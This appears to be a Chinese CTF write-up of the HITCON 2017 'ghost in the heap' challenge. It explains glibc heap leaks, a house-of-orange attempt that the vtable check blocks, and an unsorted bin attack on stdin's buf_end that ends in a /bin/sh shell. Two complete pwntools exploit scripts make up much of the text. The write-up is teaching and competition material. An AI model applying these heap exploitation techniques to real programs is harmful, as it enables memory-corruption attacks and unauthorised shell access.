> 原文链接: https://www.anquanke.com//post/id/87307 


# 【CTF攻略】hitcon2017之ghost in the heap writeup


                                阅读量   
                                **210587**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01ea4fe3a37fd84254.png)](https://p0.ssl.qhimg.com/t01ea4fe3a37fd84254.png)

作者：[mute_pig](http://bobao.360.cn/member/contribute?uid=1334092065)

预估稿费：600RMB

（本篇文章享受双倍稿费 活动链接请[点击此处](http://bobao.360.cn/news/detail/4370.html)）

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**



这次出题人是上次**houseoforange**的出题人[angelboy](http://4ngelboy.blogspot.tw/)，这次出题的思路也很赞，光是想个**unsorted bin**的构造就想了两天，可惜的是最后使用**houseoforange**的时候发现是用了添加**vtable**验证的最新版**libc**，所以只能在赛后研究[出题人题解](https://github.com/scwuaptx/CTF/tree/master/2017-writeup/hitcon/ghost_in_the_heap)了。

<br>

**1. ALL**

****

照例还是先看一下保护，和去年一样保护全开；接着看一下各个功能：

**new heap**

最多可以申请3个堆，大小固定的是0xa8，申请完就读值进去，然后会在字符串最后加个**x00**。 <br>

**delete heap**

首先获取要释放堆的下标(0-2)，然后释放后只是将其**ptr**置0(**heapptr****[index]=0](http://www.mutepig.club/index.php/archives/70/)**)，但并没有将其空间置0。

**add ghost**

**ghost**只能有一个，会**malloc**0x50的空间，最后8位是读入一个数字**magic**；之前的0x47是**description**，如果最后一个是**n**则替换为**x00**。

**remove ghost**

直接释放**ghost**的**ptr**。

**watch ghost**

判断有没有**ghost**，接着读入**magic**判断是否和上面输入的相同，不同就退出，相同就打印**description**。

那么可以总结一下主要功能：可以申请3个大小为0xb0的**chunk**,并且可以覆盖下一个**chunk**的**size**的最低位；以及可以申请一个大小为0x60的**chunk**；这四个**chunk**都能被释放且不会清空其中的内容，但不能修改各个**chunk**的内容；最后就是能查看内容的只有0x60的**chunk**。

<br>

**2. LEAK**

****

**a) libc**

**unlink**已经构造好了，那么关键就是泄露地址了，由于能查看内容的只有**ghost**，所以需要围绕它来进行构造。这里需要泄露**libc**和**heap**的地址。 泄露地址和一般一样，就是因为释放空间后没有清空，所以可以直接释放后再申请后打印，**libc**的地址就存进去了。 由于**ghost**是没有强行加**x00**的，所以我们可以覆写**fd**但是打印出来**bk**。 于是可以构造

```
newheap(0)
newheap(1)
delheap(0)
addghost(1,'1'*8)
```

这样就能将**libc**的地址泄露出来了，但是我们还需要泄露堆地址。

**b) heap**

泄露堆地址的方法其实和泄露**libc**的一样，都是利用释放后的**smallbins**的链表，只是泄露**libc**只需要释放一个**chunk**就行了，但是泄露**heap**就需要释放两个才行。

```
# 将ghost加入fastbin
newheap(0)
addhost(1,'1')
delghost()
# 构造堆
newheap(1)
newheap(2)
```

结果上面两步之后，形成堆结构如下：

```
+=======+
 heap_0
+=======+
 fastbin
+=======+
 heap_1
+=======+
 heap_2
+=======+
```

然后释放**heap_2**，由于和**top**合并使得最后的**size**超过了**fastbin**的收缩阈值，所以就会调用**malloc_consolidate**将**ghost**加入**unsorted bin**

```
delheap(2)
```

接着将**heap_1**和**ghost**合并

```
newheap(2)
delheap(1)
```

形成堆结构如下：

```
+=======+
 heap_0
+=======+
heap_1+ghost =&gt; unsorted bin
+=======+
 heap_2
+=======+
```

接着继续分割战场

```
newheap(1)
delheap(0)
```

形成堆结构如下：

```
+=======+
 heap_0 =&gt; unsorted bin
+=======+
 heap_1
+=======+
unsorted bin #(will be malloced to GHOST)
+=======+
 heap_2
+=======+
```

那么此时我们就已经拥有了两个**unsorted bin**，那么最后创建**ghost**就能继承**unsorted bin**了，并且其**fd**和**bk**都指向**heap_0**。 最后放个总的流程图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.mutepig.club/usr/uploads/2017/11/220943301.png)<br>**<br>**

**3. EXPLOIT**<br>

攻击思路有下面两个，不过都存在点问题需要绕过 * unlink 由于需要绕过**unlink**的判断，所以我们需要找到一个指向**P+0X10**的指针，也就是需要伪造一个堆才行。 那么在**free**的时候，**unlink**可以合并前面或者后面的空闲块，但在这都有限制：

```
前： 需要伪造P-&gt;prev_size并且P-&gt;PREV_INUSE=0，但是这里P-&gt;size都小于0x100，用NULL BYTE覆盖后size就为0了，所以不行
后： 需要伪造P-&gt;size，失败原因同上
```

而最关键的是，这里不存在修改某**chunk**的功能，同时由于开启了**PIE**也无法泄露**heap_ptr**的地址，所以**unlink**应该是不行的。 * houseoforange 由于这里的**ghost**大小正好是0x60，那么如果我们将它置入**unsorted bin**，并且之后可以修改**ghost-&gt;bk**，那么就能够实现攻击。 首先申请如下的堆

```
newheap(0)
addghost(1, '1')
newheap(1)
newheap(2)
```

接着将**ghost**加入**unsorted bin**同时和释放的**heap_0**合并，再把**heap2_2**申请出来用来隔断**top**，最后释放**heap_1**将**heap_2**以上合并成一个整块

```
delghost()
delheap(0)
delheap(2)
newheap(2)
delheap(1)
```

接着释放**heap_0**，再重新申请用来覆盖**unsorted bin**的**size**，使之从0x110-&gt;0x100

```
newheap("0"*0xa0 + p64(0xb0))
```

到这一步骤的流程图如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.mutepig.club/usr/uploads/2017/11/21343065.png)

接着再申请**heap_1**，使得**unsorted bin**的**PREV_INUSE**变成1，这样才能释放**heap_0**

```
newheap(1)
delheap(1)
delheap(0)
```

最后申请一个**ghost**，再申请一个**heap_0**，这时**heap_2**的上一个**chunk**的指向就被**heap_0**包含了，从而我们可以在**heap_0**里面构造一个**fake_chunk**

```
+=======+
 ghost (0x60)
+=======+
 heap_0 (0xb0)
+=======+
unsorted bin (0xa0)
+=======+
 无主之地 (0x10)
+=======+
 heap_2 (prev_size=0x110 包含于heap_0 size=0x60表示上一块没使用)
+=======+
```

到这里的流程图如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.mutepig.club/usr/uploads/2017/11/1736029287.png)

这样最后释放**heap_2**的时候，就会调用**unlink**与我们构造的**fake_chunk**合并为一个**unsorted bin**，而我们此时可以控制其头部，于是就可以实现**houseoforange**攻击了。 由于给的**libc**是最新版的，所以对**vtable**进行了校验，所以无法使用**houseoforange**。那么先放个本地成功的**exp**：

```
#!/usr/bin/env python
# encoding: utf-8

from pwn import *
p = process("./ghost")
libc = ELF("./libc.so.6")

def newheap(data):
    p.recvuntil("Your choice: ")
    p.sendline("1")
    p.recvuntil("Data :")
    p.sendline(str(data))

def delheap(index):
    p.recvuntil("Your choice: ")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(str(index))

def addghost(magic, desc):
    p.recvuntil("Your choice: ")
    p.sendline("3")
    p.recvuntil("Magic :")
    p.sendline(str(magic))
    p.recvuntil("Description :")
    p.send(desc)

def seeghost(magic):
    p.recvuntil("Your choice: ")
    p.sendline("4")
    p.recvuntil("Magic :")
    p.sendline(str(magic))

def delghost():
    p.recvuntil("Your choice: ")
    p.sendline("5")


def leak_libc():
    newheap("0")
    newheap("1")
    delheap(0)
    addghost(1,'1'*8)
    seeghost(1)
    ret = p.recvuntil('$')
    addr = ret.split('11111111')[1][:-1].ljust(8,'x00')
    unsorted_addr = u64(addr)-0xa0
    libc_addr = (unsorted_addr &amp; 0xfffffffff000)-0x3c4000
    delghost()
    delheap(1)
    return unsorted_addr , libc_addr

def leak_heap():
    newheap("0")
    addghost(1,'1'*8+'2'*8)
    delghost()
    newheap("1")
    newheap("2")
    delheap(2)
    newheap("2")
    delheap(1)
    newheap("1")
    delheap(0)
    addghost(1,'1'*9)
    #delheap(0)
    seeghost(1)
    ret = p.recvuntil('$')
    addr = ret.split('11111111')[1][:-1].ljust(8,'x00')
    heap_addr = (u64(addr)-0x31)
    delghost()
    delheap(1)
    delheap(2)
    return heap_addr

def houseoforange(heap_addr):
    write_addr = heap_addr + 0x70
    aim_addr = heap_addr + 0xb0
    fd = write_addr - 0x18
    bk = write_addr - 0x10

    # malloc for 4
    newheap("0")
    addghost(1,'1')
    newheap("1")
    newheap("2")
    # unsortedbin(0x1c0) heap_2
    delghost()
    delheap(0)
    delheap(2)
    newheap("2")
    delheap(1)

    # heap_0 unsortedbin(0x100) nobody(0x10) heap_2
    newheap("0"*0xa0 + p64(0xb0))
    newheap("1")
    delheap(1)
    delheap(0)
    # heap_0=&gt;fake_chunk
    addghost(1,p64(0) + p64(system_addr))
    payload = p64(aim_addr) + p64(aim_addr)
    payload += "0"*0x30 + p64(0) + p64(0x111) + p64(fd) + p64(bk)
    newheap(payload)
    newheap("dddddd")
    delheap(2)
    newheap(2)
    delheap(1)
    payload = p64(0xffffffffffffffff) + p64(0)*2 + p64(heap_addr+0x18-0x18)
    newheap(payload)
    delheap(0)

    delheap(2)
    payload = "0"*0x40 + "/bin/shx00" + p64(0x61) + p64(0) + p64(io_addr-0x10) + p64(2) + p64(3)
    newheap(payload)
    p.recvuntil("Your choice: ")
    p.sendline("1")


if __name__=='__main__':
    unsorted_addr, libc_addr = leak_libc()
    system_addr = libc_addr + libc.symbols['system']
    io_addr = unsorted_addr + 0x9a8
    free_hook_addr = libc_addr + libc.symbols['__free_hook']
    heap_addr = leak_heap()
    log.success("unsorted_addr: %s"%(hex(unsorted_addr)))
    log.success("system_addr: %s"%(hex(system_addr)))
    log.success("free_hook_addr: %s"%(hex(free_hook_addr)))
    log.success("heap_addr: %s"%(hex(heap_addr)))
    log.success("io_addr: %s"%(hex(io_addr)))
    raw_input()
    houseoforange(heap_addr)
    p.interactive()
```



**4. 正解思路**

****

上面的**houseoforange**其实已经接近正解了，但是由于**libc**的原因所以没法实现。 正解思路是利用**unsorted bin attck**来覆盖**stdin**的**buf_end**，由于**unsorted bin**的位置是在**main_arena**中，所以在**scanf**中调用**ead (fp-&gt;_fileno, buf, size))**来将数据先读入缓冲区这里会使得**size=unsorted bin-buf_base**，于是可以篡改**stdin**到**unsorted bin**中的所有数据，也包括**malloc_hook**的指向，最终实现**getshell**，下面我们从源码层面分析一下： 首先跟踪一下**scanf**的源码，看一下如何走到**read**函数。 在**_IO_vfscanf_internal**先调用了一下**inchar**

```
618	      
619	      fc = *f++;
620	      if (skip_space || (fc != L_('[') &amp;&amp; fc != L_('c')
621	                         &amp;&amp; fc != L_('C') &amp;&amp; fc != L_('n')))
622	        `{`
623	          
624	          int save_errno = errno;
625	          __set_errno (0);
626	          do
627	            
631	            if (__builtin_expect ((c == EOF || inchar () == EOF) // 读入字符
632	                                  &amp;&amp; errno == EINTR, 0))
633	              input_error ();
634	          while (ISSPACE (c));
635	          __set_errno (save_errno);
636	          ungetc (c, s);
637	          skip_space = 0;
638	        `}`
```

看一下**inchar**的定义，发现这里调用了**_IO_getc_unlocked**，而**_IO_getc_unlocked**调用了**__uflow**

```
117	# define inchar()        (c == EOF ? ((errno = inchar_errno), EOF)              
118	                         : ((c = _IO_getc_unlocked (s)),                      
119	                            (void) (c != EOF                                      
120	                                    ? ++read_in                                      
121	                                    : (size_t) (inchar_errno = errno)), c))

400	#define _IO_getc_unlocked(_fp) 
401	       (_IO_BE ((_fp)-&gt;_IO_read_ptr &gt;= (_fp)-&gt;_IO_read_end, 0) 
402	        ? __uflow (_fp) : *(unsigned char *) (_fp)-&gt;_IO_read_ptr++)
```

那么可以参考一下我在博客中[unflow的分析，可以知道它会调用**_IO_new_file_underflow**，并调用**_IO_file_read**，最终调用**__read (fp-&gt;_fileno, buf, size))**来将数据先读入缓冲区，这时**fp_fileno**指向**stdin**,**buf**指向**buf_base**，而**size=buf_end-buf_base**。 可以看下**angelboy**给的原理图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.mutepig.club/usr/uploads/2017/11/4172207018.png)

除了修改**buf_end**之外，还需要不让函数报错，一个是**_IO_vfscanf_internal**中的

```
3021	  UNLOCK_STREAM (s);
```

需要让**lock**合法，另一个就是要通过**vtable**的校验。 最终跳转的地址是**libc**中一段可以**getshell**的位置，大致是调用了**execve("/bin/sh",argv,env)**。 最终exp如下，如果要改**libc**的话需要注意的是求**libc**地址的偏移，以及各个**stdin**属性的偏移：

```
#!/usr/bin/env python
# encoding: utf-8

p = process("./ghost")
libc = ELF("./libc.so.6")

def newheap(data):
    p.recvuntil("Your choice: ")
    p.sendline("1")
    p.recvuntil("Data :")
    p.sendline(str(data))

def delheap(index):
    p.recvuntil("Your choice: ")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(str(index))

def addghost(magic, desc):
    p.recvuntil("Your choice: ")
    p.sendline("3")
    p.recvuntil("Magic :")
    p.sendline(str(magic))
    p.recvuntil("Description :")
    p.send(desc)

def seeghost(magic):
    p.recvuntil("Your choice: ")
    p.sendline("4")
    p.recvuntil("Magic :")
    p.sendline(str(magic))

def delghost():
    p.recvuntil("Your choice: ")
    p.sendline("5")

def leak_libc():
    newheap("0")
    newheap("1")
    delheap(0)
    addghost(1,'1'*8)
    seeghost(1)
    ret = p.recvuntil('$')
    addr = ret.split('11111111')[1][:-1].ljust(8,'x00')
    unsorted_addr = u64(addr)-0xa0
    libc_addr = (unsorted_addr &amp; 0xfffffffff000)-0x3c1000
    delghost()
    delheap(1)
    return libc_addr

def leak_heap():
    newheap("0")
    addghost(1,'1'*8+'2'*8)
    delghost()
    newheap("1")
    newheap("2")
    delheap(2)
    newheap("2")
    delheap(1)
    newheap("1")
    delheap(0)
    addghost(1,'1'*9)
    #delheap(0)
    seeghost(1)
    ret = p.recvuntil('$')
    addr = ret.split('11111111')[1][:-1].ljust(8,'x00')
    heap_addr = (u64(addr)-0x31)
    delghost()
    delheap(1)
    delheap(2)
    return heap_addr

def exploit(heap_addr):
    write_addr = heap_addr + 0x70
    aim_addr = heap_addr + 0xb0
    fd = write_addr - 0x18
    bk = write_addr - 0x10

    # malloc for 4
    newheap("0")
    addghost(1,'1')
    newheap("1")
    newheap("2")
    # unsortedbin(0x1c0) heap_2
    delghost()
    delheap(0)
    delheap(2)
    newheap("0")
    newheap("2")
    delheap(1)

    # heap_0 unsortedbin(0x100) nobody(0x10) heap_2
    delheap(0)
    newheap("0"*0xa0 + p64(0xb0))
    newheap("1")
    delheap(1)
    delheap(0)
    # heap_0=&gt;fake_chunk
    addghost(1,"/bin/shx00")
    payload = p64(aim_addr) + p64(aim_addr)
    payload += "0"*0x30 + p64(0) + p64(0x111) + p64(fd) + p64(bk)
    newheap(payload)
    newheap("1")
    delheap(2)
    # now we have unsorted bin in heap_0
    # ghost(0x60) heap_0(0xb0)(unsorted bin here) smallbins heap_1
    newheap(2)
    delheap(1)
    newheap("0")
    delheap(0)

    # unsorted bin attack
    delheap(2)
    payload = "x00"*0x40 + p64(0) + p64(0xb1) + p64(0) + p64(buf_end_addr-0x10)
    newheap(payload)

    payload = ("x00"*5 + p64(lock_addr) + p64(0)*9 + p64(io_jump_addr)).ljust(0x1ad,"x00")+ p64(system_addr) # set stdin-&gt;buf_end = unsorted_bin_addr
    newheap(payload)
    delheap(0)

if __name__=='__main__':
    libc_addr = leak_libc()
    system_addr = libc_addr + 0xf24cb
    malloc_hook_addr = libc_addr + libc.symbols['__malloc_hook']
    buf_end_addr = libc_addr + 0x3c1900
    lock_addr = libc_addr + 0x3c3770
    io_jump_addr = libc_addr + 0x3be400
    heap_addr = leak_heap()
    log.success("system_addr: %s"%(hex(system_addr)))
    log.success("malloc_hook_addr: %s"%(hex(malloc_hook_addr)))
    log.success("heap_addr: %s"%(hex(heap_addr)))
    log.success("stdin_addr: %s"%(hex(buf_end_addr)))
    #raw_input()
    exploit(heap_addr)
    p.interactive()
```

那么这里最后还有个问题，就是明明我们修改的是**__malloc_hook**，为啥最后是调用**delheap**来实现跳转的呢？这是因为在最后调用**free**的时候，出现了报错，所以调了**malloc_printerr**来打印错误，而这个函数是会调用**malloc**的，调用过程如下：

```
#0  __GI___libc_malloc (bytes=bytes@entry=0x24) at malloc.c:2902
#1  0x00007fdb8b341f5a in __strdup (s=0x7fff4018f390 "/lib/x86_64-lin"...) at strdup.c:42
#2  0x00007fdb8b33d7df in _dl_load_cache_lookup (name=name@entry=0x7fdb8b0e7646 "libgcc_s.so.1") at dl-cache.c:311
#3  0x00007fdb8b32e169 in _dl_map_object (loader=loader@entry=0x7fdb8b5494c0, name=name@entry=0x7fdb8b0e7646 "libgcc_s.so.1", type=type@entry=0x2, trace_mode=trace_mode@entry=0x0, mode=mode@entry=0x90000001, nsid=) at dl-load.c:2342
#4  0x00007fdb8b33a577 in dl_open_worker (a=a@entry=0x7fff4018fa80) at dl-open.c:237
#5  0x00007fdb8b335564 in _dl_catch_error (objname=objname@entry=0x7fff4018fa70, errstring=errstring@entry=0x7fff4018fa78, mallocedp=mallocedp@entry=0x7fff4018fa6f, operate=operate@entry=0x7fdb8b33a4d0, args=args@entry=0x7fff4018fa80) at dl-error.c:187
#6  0x00007fdb8b339da9 in _dl_open (file=0x7fdb8b0e7646 "libgcc_s.so.1", mode=0x80000001, caller_dlopen=0x7fdb8b070b81, nsid=0xfffffffffffffffe, argc=, argv=, env=0x7fff401907a8) at dl-open.c:660
#7  0x00007fdb8b09e56d in do_dlopen (ptr=ptr@entry=0x7fff4018fca0) at dl-libc.c:87
#8  0x00007fdb8b335564 in _dl_catch_error (objname=0x7fff4018fc90, errstring=0x7fff4018fc98, mallocedp=0x7fff4018fc8f, operate=0x7fdb8b09e530, args=0x7fff4018fca0) at dl-error.c:187
#9  0x00007fdb8b09e624 in dlerror_run (args=0x7fff4018fca0, operate=0x7fdb8b09e530) at dl-libc.c:46
#10 __GI___libc_dlopen_mode (name=name@entry=0x7fdb8b0e7646 "libgcc_s.so.1", mode=mode@entry=0x80000001) at dl-libc.c:163
#11 0x00007fdb8b070b81 in init () at ../sysdeps/x86_64/backtrace.c:52
#12 __GI___backtrace (array=array@entry=0x7fff4018fd00, size=size@entry=0x40) at ../sysdeps/x86_64/backtrace.c:105
#13 0x00007fdb8af7a9f5 in backtrace_and_maps (do_abort=, do_abort@entry=0x2, written=, fd=fd@entry=0x3) at ../sysdeps/unix/sysv/linux/libc_fatal.c:47
#14 0x00007fdb8afd27e5 in __libc_message (do_abort=do_abort@entry=0x2, fmt=fmt@entry=0x7fdb8b0ebe98 "*** Error in `%"...) at ../sysdeps/posix/libc_fatal.c:172
#15 0x00007fdb8afdb37a in malloc_printerr (ar_ptr=, ptr=, str=0x7fdb8b0ebff0 "free(): invalid"..., action=0x3) at malloc.c:5006
#16 _int_free (av=, p=, have_lock=0x0) at malloc.c:3867
#17 0x00007fdb8afdf53c in __GI___libc_free (mem=) at malloc.c:2968
```
